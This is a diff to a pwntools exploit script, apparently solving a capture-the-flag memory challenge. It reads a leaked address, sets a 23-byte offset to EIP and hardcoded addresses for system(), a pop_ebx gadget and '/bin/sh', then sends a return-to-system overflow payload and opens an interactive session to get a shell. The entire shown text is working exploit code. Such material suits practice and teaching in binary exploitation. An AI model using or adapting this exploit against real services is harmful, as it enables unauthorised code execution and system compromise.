@@ -70,20 +70,31 @@ def main():
     io = start()
     ru(b"\n\n\n------Test Your Memory!-------\n")
 
-    m = rl(timeout=2)
-    log.success(f"RECVED RANDOM BYTES: {m}")
+    random = rl(timeout=2)
+    log.success(f"RECVED RANDOM BYTES: {random}")
 
     ru("see? : ")
     leak = int(rl(), 16)
 
     log.success(f"LeaK : {hex(leak)}")
 
+
+    # offset to eip
+    offset = 23
+    ret = 0x08049009
+    pop_ebx = 0x08049022
+    system = 0x8049443
+    binsh = 0x804a020
     payload = flat(
-        m,
-        cyclic(500)
+        #random,
+        cyclic(offset),
+        #ret,
+        system,
+        pop_ebx,
+        leak
     )
 
-    ru("> ", timeout=2)
+    ru("> ", timeout=1)
     sl(payload)
     ia()
 
